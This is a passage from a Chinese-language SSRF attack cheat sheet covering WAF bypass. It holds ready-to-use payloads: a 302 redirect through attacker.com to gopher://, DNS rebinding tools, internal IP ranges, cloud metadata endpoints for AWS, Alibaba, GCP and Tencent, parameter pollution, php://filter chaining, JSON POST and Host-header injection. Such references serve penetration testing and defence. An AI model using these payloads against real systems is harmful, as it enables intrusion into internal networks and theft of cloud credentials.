## 八、WAF绕过与高级技巧

### 8.1 协议白名单绕过
```
# 目标只允许http/https协议？
# 尝试重定向到其他协议
http://attacker.com/302.php → 302 → gopher://...
# 某些HTTP客户端跟随重定向时不限制协议

# DNS重绑定到file://
http://rebind-attacker.com → 第一次解析为attacker.com，第二次为file://？不可能
# 实际只能通过302跳转绕过协议限制
```

### 8.2 DNS rebinding平台
```
# 工具
- https://lock.cmpxchg8b.com/rebinder.html
- https://github.com/nccgroup/singularity
- https://github.com/taviso/rbndr
```

### 8.3 内网IP段探测扩展
```
# 常见内网段
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
169.254.0.0/16（云元数据）
100.64.0.0/10（运营商级NAT/云VPC）
0.0.0.0/8
localhost.localdomain

# Docker默认
172.17.0.0/16

# Kubernetes Service
10.96.0.0/12

# 元数据
169.254.169.254
100.100.100.200（阿里云）
metadata.google.internal（GCP）
metadata.tencentyun.com（腾讯云）
```

### 8.4 参数污染（HPP）
```
?url=http://safe.com&url=http://127.0.0.1
?url=http://safe.com?next=http://127.0.0.1
```

### 8.5 文件包含配合SSRF
```
# 若后端会curl后include结果
# php://filter + SSRF
?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/
```

### 8.6 POST请求SSRF
```
# 许多SSRF点是POST参数
# 尝试GET/POST转换
# 修改Content-Type: application/json
{"url":"http://127.0.0.1/"}
```

### 8.7 Header注入触发SSRF
```
# 通过X-Forwarded-For/Host等头注入
X-Forwarded-For: 127.0.0.1
Host: internal-service
# 某些应用会请求Host头对应的地址
```

